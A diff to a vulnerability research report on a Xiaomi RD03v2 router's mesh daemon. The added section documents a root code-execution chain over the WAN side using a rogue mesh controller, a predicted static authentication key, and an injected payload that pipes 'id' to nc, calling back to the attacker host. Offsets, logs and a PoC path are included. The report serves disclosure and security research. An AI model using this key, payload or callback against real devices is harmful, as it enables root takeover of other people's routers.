@@ -13,10 +13,13 @@ router's Wi-Fi.
 romversion 2.0.28 | hardware RD03v2 | model xiaomi.router.rd03v2
 ```
 
-Port 19553 is closed until the device is initialised; `/etc/init.d/cab_meshd` starts
-the CAP server (`-S -i br-lan`) only when `INITTED=YES`. TLS to it, with **no client
-certificate**, succeeds: `TLSv1.2`, `ECDHE-RSA-AES256-GCM-SHA384`, server cert
-`CN=xiaoqiang` / issuer `CN=xiaoqiang-cn`.
+The inbound CAP listener on port 19553 is closed until the device is initialized;
+`/etc/init.d/cab_meshd` starts the CAP server (`-S -i br-lan`) only when
+`INITTED=YES`. On a factory-reset unit, runtime WAN assignment instead starts the
+RE client (`-C -i eth1.4`), which broadcasts discovery and connects outbound to a
+CAP. CAP-side TLS, with **no client certificate**, succeeds: `TLSv1.2`,
+`ECDHE-RSA-AES256-GCM-SHA384`, server cert `CN=xiaoqiang` / issuer
+`CN=xiaoqiang-cn`.
 
 ## V1 — admin takeover: CONFIRMED end-to-end (read-only against the target)
 
@@ -130,7 +133,93 @@ This does not establish V2 reachability after ordinary Xiaomi web setup.
 
 ---
 
-## V2 — root RCE via direct injection: CONFIRMED in emulation (daemon-driven)
+## V2 RE/WAN — direct root RCE: CONFIRMED end-to-end on physical hardware
+
+Test date: 2026-10-01. The router began at factory defaults:
+
+```
+hardware=RD03v2  romversion=2.0.28  inited=0
+```
+
+The WAN-side test segment was isolated at `192.168.77.0/24`; the rogue CAP host
+used `192.168.77.1`, and DHCP leased `192.168.77.142` to the router's WAN MAC.
+No V1 leak, web login, admin API, or `init_router.py` action occurred in the final
+exploit run.
+
+### Startup and discovery
+
+Despite `option ifname ''` in the shipped static config, boot-time port assignment
+populated `network.wan.ifname=eth1.4` before `START=99`. The live daemon command was:
+
+```
+/usr/sbin/cab_meshd -C -i eth1.4
+```
+
+It obtained the DHCP lease, created `/tmp/cab_meshd_gw_ip`, and broadcast the
+18-byte NUL-terminated RE marker every five seconds:
+
+```
+192.168.77.142 -> 255.255.255.255:19553  MIROUTE_RE_DDv1.0\0
+```
+
+The rogue CAP returned `MIROUTE_CAP_DDv1.0` plus `192.168.77.1` at offset `0x12`.
+The RE then initiated TCP and TLS to the advertised address.
+
+### Reversed authentication
+
+The RE's initial type-4 used the `q38d…` role key. The rogue CAP replied with a
+type-4 token computed from the statically predicted
+`x38d364d8ed3bd085e150211ea6b3715` key. The hardware accepted it:
+
+```
+[RE]: ST_SSL_DONE -> ST_AUTH_SENT
+[RE]: ST_AUTH_SENT -> ST_AUTH_SENT_2
+INF: id: roguecap00001, ... key: x38d364d8ed3bd085e150211ea6b3715
+[RE]: ST_AUTH_SENT_2 -> ST_RUNNING
+```
+
+TLS negotiated `TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384`; the rogue CAP used a
+self-signed certificate and required no client certificate.
+
+### Type-6 delivery and root proof
+
+The accepted sync body was 1,764 bytes, matching the stock CAP's layout. Four
+ordinary front-haul password and management fields had to be populated for both
+bands. With the factory body those fields are empty; unquoted `$@` in
+`run_with_lock` drops them and shifts the later `bh_ssid`/`bh_pswd` values away
+from `do_re_init` `$7/$8`.
+
+The final payload occupied `bh_pswd` at body offset `0x107`:
+
+```
+`id|nc 192.168.77.1 80`
+```
+
+The RE accepted type-6 (`type-7 body[0]=1`), invoked `mesh_connect.sh re_init`,
+decoded the base64-laundered field, and called back:
+
+```
+[ROOT PROOF] callback from 192.168.77.142: uid=0(root) gid=0(root)
+[+] CONFIRMED: RE/WAN payload executed as uid 0 (root)
+```
+
+The proof expression is 23 bytes. The daemon encoder accepts up to 36/66 raw bytes
+for the two fields; their reliable non-overlapping wire slots hold 32/64 bytes.
+
+### State and cleanup
+
+A completed `re_init` set `INITTED=YES` (`init_info.inited=1`), stopped `cab_meshd`, changed the wired DHCP
+client from the WAN MAC to the LAN MAC, and made the wired interface part of the
+new mesh configuration. The path is therefore one-shot after a successful run,
+even though `do_re_init` lacks a `NETMODE` guard and `check_re_initted` is unused.
+
+After validation, the router was factory-reset and rechecked as RD03v2 stock
+2.0.28 with `inited=0`. The isolated DHCP namespace and listener were removed.
+PoC: `poc/re_wan_rce.py`.
+
+---
+
+## V2 CAP/LAN — direct root RCE: CONFIRMED in emulation (daemon-driven)
 
 Under the qemu-user harness running the **real stock `cab_meshd` binary and shell
 scripts**, with a clean on-disk config (`NETMODE` unset), a client that completed the
@@ -156,13 +245,12 @@ the first `cap_init` fires the eval, then self-gates (one-shot).
    the eval. The brief blip seen for `` `reboot` ``/`` `halt` ``/`` `telnetd` `` is the
    `cap_delete_vap` teardown that runs before the guard, not the payload.
 
-### Direct injection not re-confirmed on hardware (superseded by OTA chain)
+### CAP/LAN direct injection not re-confirmed on hardware
 
 The direct CAP-path injection (type-4 plant) was not re-fired on the physical unit
 after the delivery fix because the tested box is `NETMODE=whc_cap`-gated. The RE/WAN
-variant is emulation-only. Both are superseded for practical exploitation by the OTA
-combined chain (see above), which **is** confirmed end-to-end on physical hardware
-and uses the same `eval` sink.
+variant is separately confirmed on factory-reset hardware above. The OTA combined
+chain remains the demonstrated route for the initialized, gate-open CAP state.
 
 ## V3 — root credential
 
@@ -183,3 +271,5 @@ Wi-Fi `encryption` UCI keys and triggers a `cap_init` reconfiguration; the
 self-repairing payload restores valid encryption afterward. No credential was used
 against the device beyond the automatically-obtained admin session; the
 `set_telnet` call errored (endpoint absent) and changed nothing.
+The RE/WAN test changes configuration when `re_init` completes; the unit was
+factory-reset after the root callback and verified at `inited=0`.
